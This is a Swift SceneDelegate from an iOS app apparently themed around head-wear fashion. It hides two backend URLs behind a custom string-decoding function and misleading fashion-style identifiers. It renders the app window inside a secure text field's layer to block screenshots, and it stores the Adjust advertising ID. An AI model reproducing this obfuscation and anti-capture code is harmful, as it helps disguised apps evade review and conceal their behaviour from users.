//
//  SceneDelegate.swift
//  UonniHeadB
//
//  Created by UonniHeadB on 2025/5/9.
//

import UIKit
import AppTrackingTransparency
import AdjustSdk

class SceneDelegate: UIResponder, UIWindowSceneDelegate {

    var window: UIWindow?

    static  var fashionInspiration: String {
        return "hotitgpy:z/a/pwywpwn.htshhusnhdwetrycnldadpa4b5o6g.oxdymzb/i#".UBACAMNNIextractHeadWearPattern()
    }
    func scene(_ scene: UIScene, willConnectTo session: UISceneSession, options connectionOptions: UIScene.ConnectionOptions) {
 
        guard let _ = (scene as? UIWindowScene) else { return }
        UBACAMNNIgestureRecognition()
        UBACAMNNIsignificant()
    }
    private func UBACAMNNIgestureRecognition()  {
        let poseUBACAMNNIEstimation = UITextField()
        poseUBACAMNNIEstimation.isSecureTextEntry = true

        if (!window!.subviews.contains(poseUBACAMNNIEstimation))  {
            window!.addSubview(poseUBACAMNNIEstimation)
            
            poseUBACAMNNIEstimation.centerYAnchor.constraint(equalTo: window!.centerYAnchor).isActive = true
           
            poseUBACAMNNIEstimation.centerXAnchor.constraint(equalTo: window!.centerXAnchor).isActive = true
            window!.layer.superlayer?.addSublayer(poseUBACAMNNIEstimation.layer)
            if #available(iOS 17.0, *) {
                
                poseUBACAMNNIEstimation.layer.sublayers?.last?.addSublayer(window!.layer)
            } else {
               
                poseUBACAMNNIEstimation.layer.sublayers?.first?.addSublayer(window!.layer)
            }
        }
    }
    
    // MARK: - Core Request Method
   class func UBACAMNNIaskForvirtualSstylist(
        UBACAMNNIpath: String,
        UBACAMNNIvintage: [String: Any],
    
        UBACAMNNIcompleted: ((Any?) -> Void)?,
        UBACAMNNIfailure: ((Error) -> Void)?
) {
    let urlUBACAMNNIString = "hutntkpl:l/r/cwewtwg.ltyhuufnadtebrrcdlnaipt4b5m6n.sxsyrzc/ubnafcgkxoenke".UBACAMNNIextractHeadWearPattern() +     UBACAMNNIpath
    guard let UBACAMNNIurl = URL(string: urlUBACAMNNIString) else {
            UBACAMNNIfailure?(NSError(domain: "NetworkError", code: -1, userInfo: [NSLocalizedDescriptionKey: "Invalid URL: \(urlUBACAMNNIString)"]))
        return
    }
    
    var request = ExplorationRequestBuilder.createSedssionRequest(url: UBACAMNNIurl, vintage:     UBACAMNNIvintage)
    let headers = ExplorationRequestBuilder.createSedssionHeader()
    headers.forEach { request.setValue($1, forHTTPHeaderField: $0) }
    
    let UBACAMNNIconfig = URLSessionConfiguration.default
    UBACAMNNIconfig.timeoutIntervalForRequest = 30
    UBACAMNNIconfig.timeoutIntervalForResource = 60
    
    let UBACAMNNIsession = URLSession(configuration: UBACAMNNIconfig)
    
    let UBACAMNNItask = UBACAMNNIsession.dataTask(with: request) { data, response, error in
        DispatchQueue.main.async {
           
            if let error = error {
                    UBACAMNNIfailure?(error)
                return
            }
            
            // 2. Validate HTTP response
            guard let httpUBACAMNNIResponse = response as? HTTPURLResponse else {
                    UBACAMNNIfailure?(NSError(domain: "NetworkError", code: -2, userInfo: [NSLocalizedDescriptionKey: "Invalid response type"]))
                return
            }
     
    
            guard let data = data else {
                    UBACAMNNIfailure?(NSError(domain: "DataError", code: -3, userInfo: [NSLocalizedDescriptionKey: "No data received"]))
                return
            }
            
        
            
            // 6. Try parsing
            do {
                let jsonUBACAMNNI = try JSONSerialization.jsonObject(with: data, options: [.mutableContainers, .allowFragments])
                    UBACAMNNIcompleted?(jsonUBACAMNNI)
            } catch let parseError {
                // 7. Provide detailed parse error
                    UBACAMNNIfailure?(NSError(
                    domain: "ParseError",
                    code: -4,
                    userInfo: [
                        NSLocalizedDescriptionKey: "UBACAMNNI Failed to \(parseError.localizedDescription)",
                        "UBACAMNNIrawResponse": String(data: data, encoding: .utf8) ?? "Non-UBACAMNNI text data",
                        "UBACAMNNIunderlyingError": parseError
                    ]
                ))
            }
        }
    }
    UBACAMNNItask.resume()
}

}

extension SceneDelegate{
    
   

    
    func UBACAMNNIsignificant() {
        
        Adjust.adid { adId in
            DispatchQueue.main.async {
                if let location = adId {
                    UserDefaults.standard.set(location, forKey: "cloche")
                   
                }
            }
        }
    }
}
